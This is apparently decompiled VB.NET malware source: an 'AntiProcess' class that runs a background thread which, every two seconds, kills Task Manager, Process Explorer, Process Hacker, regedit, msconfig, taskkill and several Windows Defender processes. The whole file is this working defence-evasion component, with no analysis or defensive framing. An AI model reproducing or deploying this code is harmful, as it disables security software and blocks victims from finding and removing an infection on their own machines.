Imports System
Imports System.Diagnostics
Imports System.Security.Permissions
Imports System.Threading

Namespace Main.Tools
	' Token: 0x02000017 RID: 23
	Friend Class AntiProcess
		' Token: 0x17000014 RID: 20
		' (get) Token: 0x06000092 RID: 146 RVA: 0x00002580 File Offset: 0x00000780
		' (set) Token: 0x06000093 RID: 147 RVA: 0x00002587 File Offset: 0x00000787
		Public Shared Property Enabled As Boolean

		' Token: 0x06000094 RID: 148 RVA: 0x0000258F File Offset: 0x0000078F
		Public Shared Sub StartBlock()
			AntiProcess.Enabled = True
			AntiProcess.BlockThread.IsBackground = True
			AntiProcess.BlockThread.Start()
		End Sub

		' Token: 0x06000095 RID: 149 RVA: 0x000072A8 File Offset: 0x000054A8
		<SecurityPermission(SecurityAction.Demand, ControlThread := True)>
		Public Shared Sub StopBlock()
			AntiProcess.Enabled = False
			Try
				AntiProcess.BlockThread.Abort()
				AntiProcess.BlockThread = AddressOf AntiProcess.Block
			Catch
			End Try
		End Sub

		' Token: 0x06000096 RID: 150 RVA: 0x000072F0 File Offset: 0x000054F0
		Private Shared Sub Block()
			While AntiProcess.Enabled
				For Each process As Process In Process.GetProcesses()
					Try
						Dim processName As String = process.ProcessName
						If processName.Equals("taskmgr") OrElse processName.Equals("ProcessHacker") OrElse processName.Equals("procexp") OrElse processName.Equals("MSASCui") OrElse processName.Equals("MsMpEng") OrElse processName.Equals("MpUXSrv") OrElse processName.Equals("MpCmdRun") OrElse processName.Equals("NisSrv") OrElse processName.Equals("ConfigSecurityPolicy") OrElse processName.Equals("MSConfig") OrElse processName.Equals("Regedit") OrElse processName.Equals("UserAccountControlSettings") OrElse processName.Equals("taskkill") Then
							process.Kill()
						End If
						GoTo IL_F6
					Catch
						GoTo IL_F6
					End Try
					Exit For
					IL_F6:
				Next
				Thread.Sleep(2000)
			End While
		End Sub

		' Token: 0x0400009C RID: 156
		Private Shared BlockThread As Thread = AddressOf AntiProcess.Block
	End Class
End Namespace
